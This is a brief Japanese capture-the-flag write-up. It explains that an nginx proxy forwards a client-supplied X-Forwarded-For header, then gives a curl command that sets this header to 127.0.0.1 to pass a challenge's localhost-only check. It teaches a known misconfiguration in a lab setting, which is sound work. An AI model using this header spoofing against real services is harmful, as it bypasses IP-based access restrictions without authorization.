https://hi120ki.github.io/ja/blog/posts/20210523-2/

↑に似たような問題のWriteUpが有ったので参考にしました。

`nginx.conf`が以下のようになっており、リクエストに`X-Forwarded-For`ヘッダがない場合はアクセス元IPアドレスをセットしてリクエストを送る、ヘッダがある場合はその値をセットしてリクエストを送るという設定になっています。

```
server {
    listen 80;
    location / {
        proxy_pass http://web:3000;

        proxy_set_header Host              $host;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

なので、以下のように`X-Forwarded-For`ヘッダをローカルホストにしてリクエストを送ればOKです。

```
curl 'http://34.170.146.252:42474/' \
  -H 'X-Forwarded-For:127.0.0.1'
```